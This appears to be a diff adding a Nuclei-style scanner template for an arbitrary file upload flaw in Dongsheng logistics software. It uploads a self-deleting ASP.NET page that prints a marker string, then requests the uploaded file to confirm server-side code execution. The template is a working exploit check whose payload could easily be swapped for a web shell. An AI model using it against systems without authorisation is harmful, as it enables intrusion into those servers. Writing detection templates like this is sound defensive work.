@@ -1,0 +1,52 @@
+id: dongshengwuliu-Upload-File-upload
+
+info:
+  name: 东胜物流软件 Upload 任意文件上传漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+        Content-Type: application/octet-stream
+
+        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9]+_[a-zA-Z0-9]+\.aspx)'
+         internal: true
+       - type: regex 
+         part: body
+         name: time
+         group: 1
+         regex:
+           - '(/+[0-9]+)'
+         internal: true
+  - raw:
+      - |
+        GET /UploadFiles/Filepuload{{time}}/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
